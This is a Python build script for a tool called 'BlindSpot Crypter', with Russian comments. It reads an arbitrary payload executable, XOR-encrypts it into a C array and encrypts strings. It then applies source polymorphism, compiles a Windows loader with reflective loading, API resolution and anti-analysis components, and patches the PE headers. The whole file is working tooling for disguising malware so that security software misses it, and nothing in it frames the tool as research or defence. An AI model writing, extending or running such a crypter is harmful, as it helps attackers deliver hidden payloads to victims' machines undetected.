# core/builder.py
# Сборка loader.exe с шифрованием payload, строк, полиморфизмом.

import os
import sys
import shutil
import subprocess
from pathlib import Path

PROJECT_ROOT = Path(__file__).parent.parent.resolve()
sys.path.insert(0, str(PROJECT_ROOT))

from core import crypter
from core import polymorph
from core import pe_patcher
from core import string_crypt


PAYLOAD_DATA_C = PROJECT_ROOT / "build" / "payload_data.c"
POLY_SRC_DIR   = PROJECT_ROOT / "build" / "poly_src"
GEN_DIR        = PROJECT_ROOT / "build" / "generated"

ALGORITHM = "xor"


def get_payload_path() -> Path:
    """Получить путь к payload — из аргумента или из дефолтной папки."""
    if len(sys.argv) >= 2:
        # Аргумент командной строки
        p = Path(sys.argv[1]).resolve()
        if not p.exists():
            print(f"[!] Payload not found: {p}")
            sys.exit(1)
        return p

    # Дефолт: payloads/input/payload.exe
    default = PROJECT_ROOT / "payloads" / "input" / "payload.exe"
    if default.exists():
        return default

    print(f"[!] Payload not found: {default}")
    print(f"    Usage: python core/builder.py <payload.exe>")
    sys.exit(1)


def generate_payload_data(payload_path: Path):
    print(f"[*] Reading payload: {payload_path}")
    raw = payload_path.read_bytes()
    print(f"    Size: {len(raw)} bytes")

    print(f"[*] Encrypting with {ALGORITHM}...")
    encrypted, key = crypter.encrypt(raw, ALGORITHM)
    print(f"    Key: {key.hex()}")
    print(f"    Encrypted size: {len(encrypted)} bytes")

    print(f"[*] Generating {PAYLOAD_DATA_C}...")
    c_code = []
    c_code.append("// Auto-generated — do not edit")
    c_code.append(crypter.to_c_array(encrypted, "g_encrypted_payload"))
    c_code.append("")
    c_code.append(crypter.to_c_array(key, "g_payload_key"))
    c_code.append("")
    c_code.append(f'const char g_payload_algorithm[] = "{ALGORITHM}";')

    PAYLOAD_DATA_C.write_text("\n".join(c_code), encoding="utf-8")
    print(f"    Written: {PAYLOAD_DATA_C}")
    return True


def generate_strings_header():
    print("[*] Generating encrypted strings...")
    out = GEN_DIR / "strings.h"
    string_crypt.generate_strings_header(out)
    print(f"    Written: {out}")
    return True


def polymorph_sources():
    print("[*] Applying polymorphism to sources...")
    src_dir = PROJECT_ROOT / "src"
    n = polymorph.polymorph_project(src_dir, POLY_SRC_DIR)
    if n == 0:
        print("[!] Polymorph failed")
        return False
    print(f"[+] Polymorphed {n} files")
    return True


def compile_loader():
    print("[*] Compiling loader.exe...")

    output = PROJECT_ROOT / "build" / "loader.exe"
    poly = POLY_SRC_DIR

    cmd = [
        "gcc",
        "-O2", "-s", "-mwindows",
        "-nostdlib", "-nostdinc",
        "-ffreestanding", "-fno-builtin",
        "-fno-stack-protector", "-fno-ident",
        f"-I{GEN_DIR}",
        f"-I{PROJECT_ROOT / 'src' / 'common'}",
        f"-I{PROJECT_ROOT / 'src' / 'loader'}",
        "-Wl,--entry=loader_entry",
        "-Wl,--subsystem,windows",
        "-o", str(output),
        str(poly / "loader" / "main.c"),
        str(poly / "loader" / "pe_parser.c"),
        str(poly / "loader" / "api_resolver.c"),
        str(poly / "loader" / "reflective.c"),
        str(poly / "loader" / "decrypt.c"),
        str(poly / "antianalysis" / "antianalysis.c"),
        str(poly / "common" / "memory.c"),
        str(PAYLOAD_DATA_C),
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print("[!] Compilation failed:")
        print(result.stderr)
        return False

    size = output.stat().st_size
    print(f"[+] loader.exe built: {size} bytes")

    print("[*] Patching PE headers...")
    if not pe_patcher.patch(str(output), verbose=True):
        print("[!] PE patch failed")
        return False

    return True


def main():
    print("=== BlindSpot Crypter ===")

    payload_path = get_payload_path()
    print(f"[*] Payload: {payload_path}")
    print()

    for proc in ("loader.exe", "loader_debug.exe", "payload_test.exe"):
        subprocess.run(["taskkill", "/F", "/IM", proc],
                       capture_output=True, shell=True)

    if not generate_strings_header():
        sys.exit(1)
    if not generate_payload_data(payload_path):
        sys.exit(1)
    if not polymorph_sources():
        sys.exit(1)
    if not compile_loader():
        sys.exit(1)

    print()
    print("[+] Done.")
    print(f"[+] Output: {PROJECT_ROOT / 'build' / 'loader.exe'}")


if __name__ == "__main__":
    main()




    